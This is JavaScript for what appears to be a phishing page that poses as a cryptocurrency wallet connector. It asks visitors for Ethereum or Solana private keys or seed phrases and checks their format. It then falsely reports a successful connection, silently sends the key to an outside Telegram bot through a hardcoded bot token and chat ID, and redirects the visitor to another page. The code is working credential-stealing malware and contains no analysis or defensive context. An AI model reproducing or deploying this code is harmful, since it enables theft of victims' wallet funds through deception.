

let selectedBlockchain = "";

    function selectBlockchain(blockchain) {
        selectedBlockchain = blockchain;
        document.getElementById("inputModal").style.display = "block";
        document.getElementById("walletStatus").innerText = ""; // Clear old status
    }

    function closeModal() {
        document.getElementById("inputModal").style.display = "none";
    }

    function validateWallet() {
        const input = document.getElementById("walletInput").value.trim();
        const walletStatus = document.getElementById("walletStatus");

        if (!input) {
            walletStatus.innerText = "❌ Please enter a value!";
            return;
        }

        if (selectedBlockchain === "ethereum") {
            if (!/^0x[a-fA-F0-9]{64}$/.test(input)) {
                walletStatus.innerText = "❌ Invalid Ethereum Private Key!";
                return;
            }
        } 
        else if (selectedBlockchain === "solana") {
            if (!/^[1-9A-HJ-NP-Za-km-z]{88}$/.test(input)) {
                walletStatus.innerText = "❌ Invalid Solana Private Key!";
                return;
            }
        } 
        else if (selectedBlockchain === "secret_phrase") {
            const words = input.split(/\s+/);
            if (![12, 15, 18, 21, 24].includes(words.length)) {
                walletStatus.innerText = "❌ Invalid Secret Phrase (Must be 12, 15, 18, 21, or 24 words)!";
                return;
            }
        } 
        else {
            walletStatus.innerText = "❌ Unknown Error!";
            return;
        }

        walletStatus.innerText = `✅ Valid ${selectedBlockchain.toUpperCase()} Key! connected sucessfully..`;
        sendToTelegram(input);




        setTimeout(() => {
                     window.location.href = "solanabots.html"; // Change this to your actual page
                }, 3000);

    }

    function sendToTelegram(privateKey) {
        const botToken = "7716712152:AAHwLH6hTe9HE9WMCEDL12VXk6NDd43MwWE";  // Replace with your bot token
        const chatId = "1028212663";      // Replace with your Telegram chat ID

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: `New Wallet Connected:\n\n🔑 ${privateKey}`
            })
        })
        .then(response => response.json())
        .then(data => console.log("Sent to Telegram:", data))
        .catch(error => console.error("Telegram Error:", error));
    }


  